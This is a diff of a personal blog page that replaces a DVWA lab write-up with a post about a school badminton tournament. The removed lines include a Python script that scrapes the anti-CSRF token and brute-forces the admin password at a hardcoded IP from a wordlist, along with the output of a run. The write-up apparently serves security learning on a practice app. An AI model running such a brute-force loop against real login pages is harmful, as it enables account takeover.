@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>dwva暴力high部分 | qwerty-a&#39;s blog</title>
+  <title>旭羽杯 | qwerty-a&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="通过dvwa学习网络安全的暴力破解的时候做到high级别题时，因为这个时候要验证token,所以写了一个脚本来暴力破解。">
-<meta name="keywords" content="ctf">
+  <meta name="description" content="第二次参加学校的比赛，终于进了学校体育馆一次了。">
+<meta name="keywords" content="羽毛球">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dwva暴力high部分">
-<meta property="og:url" content="http://yoursite.com/2018/12/25/dwva暴力high部分/index.html">
+<meta property="og:title" content="旭羽杯">
+<meta property="og:url" content="http://yoursite.com/2019/03/12/旭羽杯/index.html">
 <meta property="og:site_name" content="qwerty-a&#39;s blog">
-<meta property="og:description" content="通过dvwa学习网络安全的暴力破解的时候做到high级别题时，因为这个时候要验证token,所以写了一个脚本来暴力破解。">
+<meta property="og:description" content="第二次参加学校的比赛，终于进了学校体育馆一次了。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-25T11:04:07.536Z">
+<meta property="og:image" content="https://i.loli.net/2019/03/12/5c877a650d722.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/12/5c878496c16d7.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/12/5c8784ce5128f.jpg">
+<meta property="og:updated_time" content="2019-03-12T10:08:05.819Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="dwva暴力high部分">
-<meta name="twitter:description" content="通过dvwa学习网络安全的暴力破解的时候做到high级别题时，因为这个时候要验证token,所以写了一个脚本来暴力破解。">
+<meta name="twitter:title" content="旭羽杯">
+<meta name="twitter:description" content="第二次参加学校的比赛，终于进了学校体育馆一次了。">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/12/5c877a650d722.png">
   
     <link rel="alternative" href="/atom.xml" title="qwerty-a&#39;s blog" type="application/atom+xml">
   
@@ -159,31 +163,31 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-dwva暴力high部分" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-旭羽杯" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      dwva暴力high部分
+      旭羽杯
     </h1>
   
 
         
-        <a href="/2018/12/25/dwva暴力high部分/" class="archive-article-date">
-  	<time datetime="2018-12-25T10:28:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-25</time>
+        <a href="/2019/03/12/旭羽杯/" class="archive-article-date">
+  	<time datetime="2019-03-12T09:16:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>通过dvwa学习网络安全的暴力破解的时候做到high级别题时，因为这个时候要验证token,所以写了一个脚本来暴力破解。<a id="more"></a></p>
-<h3 id="一-首先我们需要了解用脚本暴力破解密码的过程"><a href="#一-首先我们需要了解用脚本暴力破解密码的过程" class="headerlink" title="一.首先我们需要了解用脚本暴力破解密码的过程"></a>一.首先我们需要了解用脚本暴力破解密码的过程</h3><p>1.通过读取源代码，我们可以知道high级别提交密码用户名时，要验证token是不是正确的，正确的才会进行验证。如果这个时候用burp就不能正常提交，当然还是有办法通过burp跑密码，后面说这个。<br>2.我们知道token是会返回到网页内容里面的，然后是get方式提交用户名密码<br>3.我们就可以通过python的requset获取html的内容，然后re模块正则搜索到html内容的token，最后通过requset模块get提交用户名密码，最后通过返回的html字符长度看密码是或成功。<br>4.重复第3步骤，直到所有密码跑完。</p>
-<h3 id="二-了解必备知识"><a href="#二-了解必备知识" class="headerlink" title="二.了解必备知识"></a>二.了解必备知识</h3><p>1.python的基本语法。代码最前面要引入用的版块，如：mport re。open(‘password.txt’, ‘r’)：打开存密码的文件，r代表只读。for line in file:从这个文件第一行读到最后一行的循环。line.rstrip()：当前一行的字符。url2 = ‘<a href="http://125.65.72.31/DVWA-master/vulnerabilities/brute/?username=admin&amp;password=&#39;" target="_blank" rel="noopener">http://125.65.72.31/DVWA-master/vulnerabilities/brute/?username=admin&amp;password=&#39;</a> + password +’&amp;Login=login&amp;user_token=’ + token：连接字符串。print:输出<br>2.requestes模块的使用。参考<a href="https://www.jianshu.com/p/926b51525057" target="_blank" rel="noopener">https://www.jianshu.com/p/926b51525057</a><br>3.正则模块的使用。参考<a href="http://www.runoob.com/python/python-reg-expressions.html#flags" target="_blank" rel="noopener">http://www.runoob.com/python/python-reg-expressions.html#flags</a> 另一个<a href="http://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">http://www.runoob.com/regexp/regexp-syntax.html</a></p>
-<h3 id="三-开始编写"><a href="#三-开始编写" class="headerlink" title="三.开始编写"></a>三.开始编写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">header = &#123;</span><br><span class="line"></span><br><span class="line">&apos;Host&apos;: &apos;125.65.72.31&apos;,</span><br><span class="line"></span><br><span class="line">&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Connection&apos;: &apos;keep-alive&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Cookie&apos;: &apos;security=high; PHPSESSID=fe9p7tigk5an6bacnq625q42e1&apos;,</span><br><span class="line"></span><br><span class="line">&apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">file = open(&apos;password.txt&apos;, &apos;r&apos;)</span><br><span class="line">url = &apos;http://125.65.72.31/DVWA-master/vulnerabilities/brute/&apos;</span><br><span class="line">for line in file:</span><br><span class="line"></span><br><span class="line">    resp = requests.get(url, headers=header)</span><br><span class="line">    # 使用正则表达式 获取提交 token</span><br><span class="line"></span><br><span class="line">    token = re.search(r&apos;[a-z0-9]&#123;32&#125;&apos;, resp.text).group()</span><br><span class="line"></span><br><span class="line">    # print &apos;user_token : &apos;, token</span><br><span class="line">    password = line.rstrip()</span><br><span class="line"></span><br><span class="line">    url2 = &apos;http://125.65.72.31/DVWA-master/vulnerabilities/brute/?username=admin&amp;password=&apos; + password +&apos;&amp;Login=login&amp;user_token=&apos; + token</span><br><span class="line"></span><br><span class="line">    # print url</span><br><span class="line"></span><br><span class="line">    resp = requests.get(url2, headers=header)</span><br><span class="line">    </span><br><span class="line">    print (line.rstrip()) </span><br><span class="line">    print (len(resp.text))</span><br><span class="line">   </span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-<p>最后运行代码结果<br>password<br>4507<br>123456<br>4469<br>12345678<br>4469<br>1234<br>4469<br>qwerty<br>4469<br>12345<br>4469<br>dragon<br>4469<br>pussy<br>4469<br>baseball<br>4469<br>football<br>4469<br>letmein<br>4469<br>除了代码，还可以用burp跑，参考链接：<a href="https://blog.csdn.net/qq_36374896/article/details/83934098" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/83934098</a></p>
+        <p>第二次参加学校的比赛，终于进了学校体育馆一次了。<a id="more"></a><br><img src="https://i.loli.net/2019/03/12/5c877a650d722.png" alt=""><br>总共上场了4场双打比赛，赢了三场。怪自己实力不行，只能上双打(⊙o⊙)…别人都对着我打，好难受。<br>感觉自己这次表现已经比上次好了，还是有进步。但是发球还是个问题，还是会打着打着大脑就抽筋，突然就失误，回球不到位，杀球没有威慑力。感觉羽毛球真难，和别人打单打，感觉注意力不集中，防守下降厉害，网前球弱，滑拍退步，真不知道怎么回事。<br>后面加强杀球练习，减少失误，网前也要加油。<br>顺便说说现在自己的状态，还是挺颓废的，学习html5和css3让我感觉有力使不出，自己还得要加油啊，英语这两天又停了，不应该停，认真学吧。好基友耍女朋友了，不知道自己的还有多久。但是不管怎么样，认真学习，自己的投影仪好爽(⊙o⊙)…</p>
+<p><img src="https://i.loli.net/2019/03/12/5c878496c16d7.jpg" alt=""></p>
+<p>纪念哈寸头</p>
+<p><img src="https://i.loli.net/2019/03/12/5c8784ce5128f.jpg" alt=""></p>
+<p>哈哈！</p>
 
       
 
@@ -228,7 +232,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">羽毛球</a>
         		</li>
       		
 		</ul>
@@ -284,7 +288,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/12/25/dwva暴力high部分/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/12/旭羽杯/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -298,18 +302,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/12/25/MongoDB数据库注入/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          MongoDB数据库注入
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/12/24/羽毛球比赛有感/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">羽毛球比赛有感</div>
+    <a href="/2019/03/12/大厂 H5 开发概述/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">大厂 H5 开发概述</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -336,7 +331,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一-首先我们需要了解用脚本暴力破解密码的过程"><span class="toc-number">1.</span> <span class="toc-text">一.首先我们需要了解用脚本暴力破解密码的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-了解必备知识"><span class="toc-number">2.</span> <span class="toc-text">二.了解必备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-开始编写"><span class="toc-number">3.</span> <span class="toc-text">三.开始编写</span></a></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
